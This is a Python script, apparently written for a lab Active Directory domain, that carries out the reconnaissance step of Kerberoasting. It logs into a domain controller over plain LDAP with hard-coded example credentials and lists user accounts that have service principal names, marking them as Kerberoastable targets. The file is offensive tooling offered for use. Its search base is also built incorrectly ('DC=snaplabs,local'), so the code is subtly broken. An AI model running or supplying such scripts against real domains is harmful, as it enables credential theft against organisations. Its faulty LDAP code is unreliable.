from ldap3 import Server, Connection, SUBTREE, ALL_ATTRIBUTES

def kerberoast(username, password, domain, dc_ip):
    try:
        # Construct LDAP URL
        ldap_url = f"ldap://{dc_ip}"

        # Connect to the domain controller via LDAP
        server = Server(ldap_url, use_ssl=False)
        conn = Connection(server, user=f"{domain}\\{username}", password=password, authentication='NTLM')
        conn.bind()

        if not conn.bound:
            print(f"Failed to bind to LDAP server {dc_ip}")
            return

        print(f"Successfully connected to LDAP server {dc_ip}")

        # Use domain name as search base
        search_base = f"DC={','.join(domain.split('.'))}"
        print(f"Search base: {search_base}")

        # Search for user objects with SPNs set
        search_filter = "(&(objectClass=user)(servicePrincipalName=*))"
        print(f"Search filter: {search_filter}")

        conn.search(search_base=search_base,
                    search_filter=search_filter,
                    search_scope=SUBTREE,
                    attributes=ALL_ATTRIBUTES)

        kerberoastable_accounts = []

        # Extract kerberoastable accounts
        for entry in conn.entries:
            kerberoastable_accounts.append(entry.entry_dn)

        conn.unbind()

        if kerberoastable_accounts:
            print("Kerberoastable Accounts:")
            for account in kerberoastable_accounts:
                print(account)
        else:
            print("No kerberoastable accounts found.")

    except Exception as e:
        print(f"Error while Kerberoasting: {e}")


# Example usage:
# Replace "username", "password", "domain", and "dc_ip" with your actual credentials and domain controller's IP address
username = "ajman"
password = "DomainAdmin123!"
domain = "snaplabs.local"
dc_ip = "10.10.0.86"  # Replace with your domain controller's IP address

kerberoast(username, password, domain, dc_ip)